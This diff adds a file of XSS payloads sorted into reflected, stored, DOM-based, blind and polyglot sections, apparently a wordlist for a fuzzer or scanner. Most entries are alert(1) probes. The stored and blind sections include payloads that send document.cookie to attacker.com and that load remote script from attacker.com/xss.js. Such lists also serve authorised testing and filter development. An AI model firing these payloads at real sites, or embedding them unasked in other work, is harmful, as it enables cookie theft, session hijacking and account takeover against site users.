@@ -1,0 +1,101 @@
+[reflected_xss]
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src=javascript:alert(1)></iframe>
+<body onload=alert(1)></body>
+<input onfocus=alert(1) autofocus>
+<a href=javascript:alert(1)>Click</a>
+<math href=javascript:alert(1)>CLICKME</math>
+<object data=javascript:alert(1)></object>
+<embed src=javascript:alert(1)>
+<video src=1 onerror=alert(1)></video>
+<audio src=1 onerror=alert(1)></audio>
+<svg onresize=alert(1)></svg>
+<title onpropertychange=alert(1)></title>
+<marquee onstart=alert(1)></marquee>
+<style onload=alert(1)></style>
+<bgsound onpropertychange=alert(1)></bgsound>
+<img src=x oneonerror=alert(1)>
+%3Cscript%3Ealert(1)%3C/script%3E
+" onmouseover="alert(1)
+
+[stored_xss]
+<script>alert('stored')</script>
+<iframe src=javascript:alert(1)></iframe>
+<a href="javascript:alert(1)">Click</a>
+<script>fetch('https://attacker.com/?cookie='+document.cookie)</script>
+<IMG SRC="javascript:alert('XSS')">
+<IMG LOWSRC="javascript:alert('XSS')">
+<BGSOUND SRC="javascript:alert('XSS')">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');">
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<TABLE BACKGROUND="javascript:alert('XSS')">
+<BODY BACKGROUND="javascript:alert('XSS')">
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+<IMG SRC="jav    ascript:alert('XSS');">
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert('XSS')>
+<IMG SRC=" &#14;  javascript:alert('XSS');">
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+
+[dom_xss]
+#<script>alert(1)</script>
+#javascript:alert(1)
+";alert(1);//
+${alert(1)}
+eval(name)
+<svg onload=alert(1)></svg>
+<iframe src=javascript:alert(1)></iframe>
+<script>({set/**/$($){_/**/setter=$,_=alert(1)}}).$=eval</script>
+<script>({0:#0=eval/#0#/#0#(alert(1))})</script>
+<script>ReferenceError.prototype.__defineGetter__('name', function(){alert(1)}),x</script>
+<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script>
+<svg onresize=alert(1)></svg>
+<svg onload=alert(1)></svg>
+<svg onunload=alert(1)></svg>
+<svg onerror=alert(1)></svg>
+<svg><script>alert(1)</script></svg>
+
+[blind_xss]
+<script src=http://attacker.com/xss.js></script>
+<img src=x onerror=fetch('http://attacker.com/?leak='+document.cookie)>
+<script>setTimeout(()=>{alert(1)},5000)</script>
+<script>fetch('https://attacker.com/?cookie='+document.cookie)</script>
+<iframe src="http://attacker.com/xss.js"></iframe>
+<img src="http://attacker.com/xss.js" onerror="fetch('http://attacker.com/?leak='+document.cookie)">
+<svg onload="fetch('http://attacker.com/?leak='+document.cookie)"></svg>
+<iframe srcdoc="<script src='http://attacker.com/xss.js'></script>"></iframe>
+<video src="1" onerror="fetch('http://attacker.com/?leak='+document.cookie)"></video>
+<audio src="1" onerror="fetch('http://attacker.com/?leak='+document.cookie)"></audio>
+<svg><script>fetch('http://attacker.com/?cookie='+document.cookie)</script></svg>
+<svg><script>setTimeout(()=>{alert(1)},5000)</script></svg>
+<iframe srcdoc="<script>setTimeout(()=>{alert(1)},5000)</script>"></iframe>
+<iframe srcdoc="<img src=x onerror=fetch('http://attacker.com/?leak='+document.cookie)>"></iframe>
+<svg onerror="fetch('http://attacker.com/?leak='+document.cookie)"></svg>
+<svg onresize="fetch('http://attacker.com/?leak='+document.cookie)"></svg>
+<svg onunload="fetch('http://attacker.com/?leak='+document.cookie)"></svg>
+<svg onerror="setTimeout(()=>{alert(1)},5000)"></svg>
+
+[polyglot_xss]
+jaVasCript:/*-/*`/*\`/*'/*"/**/(alert(1))//
+';alert(1)//";alert(1)//--></script><script>alert(1)</script>
+" onfocus=alert(1) autofocus="
+<xss id=x tabindex=1 onfocus=alert(1)></xss>
+<script>alert(1)</script><img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+<iframe src=javascript:alert(1)></iframe>
+<math href=javascript:alert(1)>CLICKME</math>
+<svg><script>alert(1)</script></svg>
+<svg onresize=alert(1)></svg>
+<svg onerror=alert(1)></svg>
+<svg onunload=alert(1)></svg>
+<svg onload=alert(1)></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg><foreignObject><script>alert(1)</script></foreignObject></svg>
+<svg><a xlink:href="javascript:alert(1)"><rect width="100" height="100"/></a></svg>
+<svg><set attributeName="onload" to="alert(1)"/></svg>
+<svg><animate attributeName="onload" to="alert(1)"/></svg>
+<svg><script xlink:href=data:,alert(1)></script></svg> 
